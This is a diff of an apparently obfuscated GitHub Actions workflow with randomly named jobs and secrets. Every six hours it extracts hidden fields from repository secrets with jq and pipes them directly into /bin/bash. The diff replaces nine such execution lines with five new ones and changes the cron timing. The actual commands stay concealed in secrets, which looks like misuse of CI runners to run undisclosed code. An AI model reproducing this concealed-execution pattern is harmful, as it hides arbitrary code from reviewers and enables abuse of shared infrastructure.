@@ -1,27 +1,21 @@
 name: chaililiang4789
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 0/6 * * *'
+    - cron: '18 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chaililiang4789
         env:
-          uju904: ${{ secrets.uju904 }}
+          ym219: ${{ secrets.ym219 }}
         run: |
-          echo $uju904 | jq -r .uvrqu6397 | /bin/bash
-          echo $kv3768 | jq -r .z84 | /bin/bash
-          echo $wtxr76 | jq -r .g07899 | /bin/bash
-          echo $mewk84 | jq -r .ztx666 | /bin/bash
-          echo $loro6092 | jq -r .fr376 | /bin/bash
-          echo $szh43 | jq -r .qmjpd0803 | /bin/bash
-          echo $cy5176 | jq -r .eqbqw0710 | /bin/bash
-          echo $h164 | jq -r .quxf5164 | /bin/bash
-          echo $bxi43 | jq -r .m956 | /bin/bash
+          echo $ym219 | jq -r .nya1050 | /bin/bash
+          echo $m34625 | jq -r .wbcl4 | /bin/bash
+          echo $af781 | jq -r .p716 | /bin/bash
+          echo $xq8 | jq -r .zojl913 | /bin/bash
+          echo $amy9546 | jq -r .fk01 | /bin/bash
 
